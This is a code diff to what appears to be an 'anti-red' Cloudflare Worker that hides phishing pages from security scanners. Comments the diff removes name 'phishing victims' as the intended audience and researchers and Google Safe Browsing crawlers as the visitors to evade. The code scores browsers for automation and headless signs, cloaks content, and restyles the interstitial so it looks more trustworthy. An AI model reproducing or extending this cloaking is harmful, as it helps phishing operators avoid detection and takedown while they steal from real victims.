@@ -523,7 +523,7 @@ function generateJSChallenge() {
   if(conn&&conn.rtt===0)s+=20;
   setTimeout(function(){
     if(s>=50){
-      document.documentElement.innerHTML='<div style=\"display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;background:#f5f5f5\"><div style=\"text-align:center;padding:40px\"><h1>Access Denied</h1><p>Your browser failed our security check.</p><p style=\"color:#666;font-size:14px\">Error: 403 AR-'+(Math.random()*1e6|0)+'</p></div></div>';
+      document.documentElement.innerHTML='<div style=\"display:flex;justify-content:center;align-items:center;height:100vh;font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#1b1b2f\"><div style=\"text-align:center;padding:40px 32px;max-width:420px;border-radius:16px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08)\"><div style=\"width:56px;height:56px;border-radius:50%;background:rgba(255,255,255,0.07);display:flex;align-items:center;justify-content:center;margin:0 auto 24px\"><svg width=\"28\" height=\"28\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"#8a9bb5\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z\"/><line x1=\"15\" y1=\"9\" x2=\"9\" y2=\"15\"/><line x1=\"9\" y1=\"9\" x2=\"15\" y2=\"15\"/></svg></div><h1 style=\"font-size:22px;font-weight:700;color:#fff;margin-bottom:12px\">Access Denied</h1><p style=\"color:#8a9bb5;font-size:15px;line-height:1.5\">Your browser failed our security check.</p><p style=\"color:#5a6a7a;font-size:13px;margin-top:20px\">Error: 403 AR-'+(Math.random()*1e6|0)+'</p></div></div>';
     }
   },800);
 })();
@@ -1807,19 +1807,52 @@ function challengePage(originalUrl, nonce) {
 <html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <meta name="robots" content="noindex,nofollow">
 <title>Security Check</title>
-<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:#e0e0e0;display:flex;justify-content:center;align-items:center;min-height:100vh}.c{text-align:center;padding:40px;max-width:420px}.s{width:40px;height:40px;border:3px solid #333;border-top-color:#4f8fff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 24px}@keyframes spin{to{transform:rotate(360deg)}}.t{font-size:18px;margin-bottom:8px;color:#fff}.d{color:#888;font-size:14px}.p{margin-top:20px;height:4px;background:#222;border-radius:2px;overflow:hidden}.pb{height:100%;background:linear-gradient(90deg,#4f8fff,#7c5cff);width:0%;transition:width 0.3s;border-radius:2px}.f{margin-top:16px;color:#555;font-size:12px}.vb{display:none;margin-top:24px;padding:14px 40px;background:linear-gradient(135deg,#4f8fff,#7c5cff);color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;transition:transform 0.15s,box-shadow 0.15s;box-shadow:0 4px 15px rgba(79,143,255,0.3)}.vb:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(79,143,255,0.4)}.vb:active{transform:translateY(0)}.vb.show{display:inline-block;animation:fadeIn 0.4s ease}.fl{display:none;margin-top:16px;color:#f44;font-size:14px}@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}</style>
-</head><body><div class="c"><div class="s" id="sp"></div><div class="t" id="tt">Verifying your browser</div><div class="d" id="dd">This is an automatic security check</div><div class="p"><div class="pb" id="pb"></div></div><div class="f" id="st">Please wait...</div><button class="vb" id="vb">Continue to site</button><div class="fl" id="fl">Verification failed. Please use a standard browser.</div></div>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;background:#1b1b2f;color:#e0e0e0}
+.card{text-align:center;padding:40px 32px 32px;max-width:420px;width:90%;border-radius:16px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px)}
+.icon{width:56px;height:56px;border-radius:50%;background:rgba(255,255,255,0.07);display:flex;align-items:center;justify-content:center;margin:0 auto 24px}
+.icon svg{width:28px;height:28px;color:#8a9bb5}
+.title{font-size:22px;font-weight:700;color:#fff;margin-bottom:12px;letter-spacing:-0.3px}
+.desc{color:#8a9bb5;font-size:15px;line-height:1.5;margin-bottom:28px}
+.btn{display:block;width:100%;padding:16px;background:#4a6fa5;color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;transition:background 0.2s,transform 0.1s;letter-spacing:0.2px}
+.btn:hover{background:#5a7fb5}
+.btn:active{transform:scale(0.98)}
+.btn:disabled{opacity:0.6;cursor:not-allowed}
+.btn.loading{background:#3a5f95}
+.foot{margin-top:20px;color:#5a6a7a;font-size:13px}
+.fl{display:none;margin-top:16px;color:#e55;font-size:14px}
+.timeout{color:#e55}
+@media(prefers-color-scheme:light){
+  body{background:#e8eaed}
+  .card{background:rgba(255,255,255,0.85);border:1px solid rgba(0,0,0,0.06);box-shadow:0 2px 24px rgba(0,0,0,0.08)}
+  .icon{background:rgba(0,0,0,0.04)}
+  .icon svg{color:#5a6a7a}
+  .title{color:#1a1a2e}
+  .desc{color:#5a6a7a}
+  .btn{background:#3d6494}
+  .btn:hover{background:#4a74a4}
+  .foot{color:#8a9bb5}
+}
+</style>
+</head><body>
+<div class="card">
+  <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg></div>
+  <div class="title" id="tt">Quick security check</div>
+  <div class="desc" id="dd">Please continue to complete a security check before accessing this website.</div>
+  <button class="btn" id="vb">Continue</button>
+  <div class="foot" id="st">Thank you for your patience.</div>
+  <div class="fl" id="fl"></div>
+</div>
 <script>
 (function(){
   var NONCE='\${nonce}';
-  var sc=0,pb=document.getElementById('pb'),st=document.getElementById('st');
+  var sc=0;
   var vb=document.getElementById('vb'),fl=document.getElementById('fl');
-  var sp=document.getElementById('sp'),tt=document.getElementById('tt'),dd=document.getElementById('dd');
+  var tt=document.getElementById('tt'),dd=document.getElementById('dd'),st=document.getElementById('st');
   var poiReady=false;
-  function up(p,t){pb.style.width=p+'%';st.textContent=t;}
 
-  // Phase 1: Automated bot detection
-  up(10,'Checking browser environment...');
+  // Phase 1: Automated bot detection (runs silently)
   var isMobile=/Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
   var isWebView=/wv|WebView|FBAN|FBAV|Instagram|Telegram|WhatsApp|Line|KakaoTalk|Snapchat|Twitter|CriOS|FxiOS|OPiOS|GSA/i.test(navigator.userAgent);
   if(navigator.webdriver)sc+=40;
@@ -1834,7 +1867,6 @@ function challengePage(originalUrl, nonce) {
   if(cn&&cn.rtt===0&&!/localhost/.test(location.hostname))sc+=15;
   if(!window.requestAnimationFrame)sc+=10;
   try{if(window.outerWidth===0||window.outerHeight===0)sc+=20;}catch(e){}
-  // Puppeteer/Playwright/CDP detection
   if(window.__puppeteer_evaluation_script__)sc+=50;
   if(navigator.userAgent.includes('Headless'))sc+=50;
   try{if(Object.getOwnPropertyNames(navigator).includes('webdriver'))sc+=30;}catch(e){}
@@ -1842,74 +1874,49 @@ function challengePage(originalUrl, nonce) {
   if(screen.width===0||screen.height===0)sc+=30;
   if(screen.width===800&&screen.height===600)sc+=15;
   if(!navigator.permissions){if(isMobile||isWebView)sc+=5;else sc+=10;}
-  // WebGL renderer check (headless uses SwiftShader)
   try{var cv=document.createElement('canvas');var gl=cv.getContext('webgl')||cv.getContext('experimental-webgl');if(gl){var dbg=gl.getExtension('WEBGL_debug_renderer_info');if(dbg){var rr=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);if(/SwiftShader|llvmpipe|softpipe/i.test(rr))sc+=30;}}}catch(e){}
-
-  // ── NEW: Linux desktop detection ──
-  // Normal phishing victims use Windows/Mac/Android/iOS. Linux desktop + Chrome is
-  // almost always a scanner, security researcher, or GSB headless browser.
   var isLinuxDesktop=/X11;\\\\s*Linux\\\\s*x86_64/.test(navigator.userAgent)&&!/Android/.test(navigator.userAgent);
   if(isLinuxDesktop&&/Chrome/.test(navigator.userAgent))sc+=30;
-
-  // ── NEW: Chrome version anomaly ──
-  // Auto-calculated ceiling — stable ~${chromeCeil.stable} at build time.
   var cvMatch=navigator.userAgent.match(/Chrome\\\\/([0-9]+)/);
   if(cvMatch){var cv2=parseInt(cvMatch[1]);if(cv2>${chromeCeil.suspicious})sc+=25;else if(cv2<${chromeCeil.old})sc+=20;}
-
-  // ── NEW: Notification permission probe ──
-  // Headless Chrome has Notification.permission='denied' but no prompt capability.
   try{if(typeof Notification!=='undefined'&&Notification.permission==='denied'&&isLinuxDesktop)sc+=10;}catch(e){}
-
-  // ── NEW: Performance timing analysis ──
-  // Automated browsers often have suspiciously fast or zero performance timings.
   try{var perf=performance.getEntriesByType('navigation')[0];if(perf&&perf.domInteractive>0&&perf.domInteractive<50)sc+=15;}catch(e){}
-
-  // ── NEW: Detect CDP (Chrome DevTools Protocol) runtime ──
   try{if(window.Runtime||window.Emulation||window.Page)sc+=30;}catch(e){}
   try{var err=new Error();if(err.stack&&err.stack.includes('puppeteer'))sc+=50;}catch(e){}
 
-  setTimeout(function(){up(40,'Verifying identity...');},600);
-  setTimeout(function(){up(70,'Almost done...');},1800);
-
-  // Phase 2: Decision at 3s
+  // Phase 2: Enable button after checks (high-score clients wait slightly longer)
+  var poiDelay=(sc>=35)?4200:3000;
   setTimeout(function(){
-    // Human fallback (2026-10-11): never dead-end a real visitor. Definite
-    // automation is already redirected server-side (Worker botScore>=100 -> 302
-    // off-site). The remaining CLIENT heuristics (Linux desktop, software WebGL
-    // on VM/RDP, empty navigator.plugins, etc.) stack past 35 for LEGITIMATE
-    // non-standard browsers, so the old hard "Verification failed" locked out
-    // real humans with no recourse. Instead EVERYONE reaches the same proof-of-
-    // interaction step: a human click (carrying a valid PoI nonce) is the gate
-    // that GSB/stealth crawlers do not perform. This site has never auto-passed
-    // anyone — a click was always required; high-score clients just wait a touch
-    // longer before the button appears.
-    var poiDelay=(sc>=35)?1200:0;
-    setTimeout(function(){
-      up(100,'One more step...');
-      sp.style.display='none';
-      tt.textContent='Almost there';
-      dd.textContent='Click the button below to continue';
-      st.textContent='';
-      vb.classList.add('show');
-      poiReady=true;
-    },poiDelay);
-  },3000);
+    poiReady=true;
+  },poiDelay);
 
   // Phase 3: Proof-of-Interaction — button click required
   vb.addEventListener('click',function(){
-    if(!poiReady)return;
+    if(!poiReady){
+      vb.textContent='Checking...';
+      vb.disabled=true;
+      var waitCheck=setInterval(function(){
+        if(poiReady){clearInterval(waitCheck);doVerify();}
+      },200);
+      setTimeout(function(){clearInterval(waitCheck);if(!poiReady){vb.textContent='Continue';vb.disabled=false;}},8000);
+      return;
+    }
+    doVerify();
+  });
+
+  function doVerify(){
     vb.disabled=true;
     vb.textContent='Verifying...';
+    st.textContent='';
     var ts=Math.floor(Date.now()/1000);
-    // Nonce was pre-computed by the Worker and embedded in this page
     window.location.href='/__ar_verify?r=\${safeUrl}&t='+ts+'&poi='+NONCE;
-  });
+  }
 
   // Timeout after 30s
   setTimeout(function(){
-    if(poiReady&&vb.classList.contains('show')&&!vb.disabled){
+    if(!vb.disabled){
       st.textContent='Session timed out. Please refresh the page.';
-      st.style.color='#f44';
+      st.className='foot timeout';
       vb.style.display='none';
     }
   },33000);
@@ -1937,7 +1944,7 @@ async function handleRequest(request) {
 
   // ── Step 0b: Read challenge-bypass flag (does NOT short-circuit other layers) ──
   // The domain-level bypass is stored in KV as 'bypass:{domain}'. When set, the
-  // user has chosen to skip the "Verifying your browser" interstitial for human
+  // user has chosen to skip the "Quick security check" page for human
   // visitors (UX preference). It does NOT disable scanner cloaking, honeypots,
   // IP bans, or any other anti-red layer. Those continue to run for everyone.
   // Bug history: previously the bypass branch did an early pass-through which
@@ -2124,7 +2131,7 @@ async function handleRequest(request) {
   // cloaked at Step 4 (botScore >= 100), honeypots ran at Step 1, IP bans at Step 0.
   if (challengeBypassed) {
     // ── STEALTH MODE silent cloak ──
-    // The visible "Verifying your browser…" interstitial is the layer that
+    // The visible "Quick security check" page is the layer that
     // catches GSB stealth crawlers (residential IPs + real Chrome UA) via
     // proof-of-interaction. With captcha off, we lose that. To partially
     // close the gap WITHOUT bringing back a visible interstitial, we drop
@@ -2375,7 +2382,7 @@ async function deployFullProtection(cpUsername, domain, plan = '') {
 
 /**
  * Remove Cloudflare Worker routes for a domain.
- * This stops the "Verifying your browser" challenge page from showing.
+ * This stops the "Quick security check" page from showing.
  * Other protections (IP blocking, UA blocking, JA3, WAF) remain active.
  */
 async function removeWorkerRoutes(domain, zoneId) {
@@ -2459,7 +2466,7 @@ async function verifyProtection(domain) {
     const normalHeaders = normalRes.headers || {}
     const normalBody = (normalRes.data || '').toString().substring(0, 2000)
 
-    if (normalHeaders['x-antired'] === 'challenge' || normalBody.includes('Verifying your browser') || normalBody.includes('Security Check')) {
+    if (normalHeaders['x-antired'] === 'challenge' || normalBody.includes('Quick security check') || normalBody.includes('Security Check')) {
       result.challengeDetected = true
       result.active = true
     }
